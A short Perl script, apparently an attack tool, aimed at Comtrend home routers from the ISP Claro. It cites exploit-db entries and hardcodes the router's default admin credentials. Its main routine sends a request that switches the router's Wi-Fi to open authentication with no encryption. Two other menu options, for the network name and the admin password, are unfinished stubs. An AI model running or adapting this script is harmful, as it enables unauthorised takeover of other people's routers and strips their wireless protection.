#!/usr/bin/perl
# http://www.exploit-db.com/exploits/16275/
# http://www.exploit-db.com/exploits/18101/

use LWP::UserAgent;
use HTTP::Request;
use URI::URL;
use strict;
use warnings;
use feature qw(switch);

print "0wn3r para router COMTREND de casa claro \n";
my $ua = LWP::UserAgent->new(agent=>'Mozilla/5.0');

$ua->credentials("192.168.1.1:80","DSL Router","admin","c1\@r0");
$ua->show_progress('TRUE');
my $response = $ua->get('http://192.168.1.1/');

if ($response->is_success)
 {
	print "***********************************\n";
	print "Presione:  \n";
	print " 1: Cambiar auth de la red \n";
	print " 2: Cambiar nombre de la red\n";
	print " 3: cambiar password administrativo\n";
	print "***********************************\n";
	my $op = <>;
	given($op){
	when(1) { changeAuth(); }
	when(2) { changeName(); }
	when(3) { changePass(); }
	}
 }
else
	{
	die $response->status_line;
	}

sub changeAuth
	{
	my $url = new URI::URL 'http://192.168.1.1/wlsecurity.wl?wl_wsc_mode=disabled&wl_wsc_reg=enabled&wsc_config_state=1&wlAuthMode=open&wlAuth=0&wlWep=disabled&wlPreauth=0&wlSsidIdx=0';
	my $resp = $ua->get($url);

	if ($resp->is_success)
		{
		print "Respuesta: ", $resp->code( ), "\n";
		print "Autenticacion ha sido cambiada a abierta sin encriptacion"
		}
	else
		{
		die $resp->status_line;
		}
	}
	
sub changeName
	{
	my $response = $ua->get('http://192.168.1.1/wlcfg.html');
	}
	
sub changePass
	{
	my $response = $ua->get('http://192.168.1.1/password.cgi');
	}


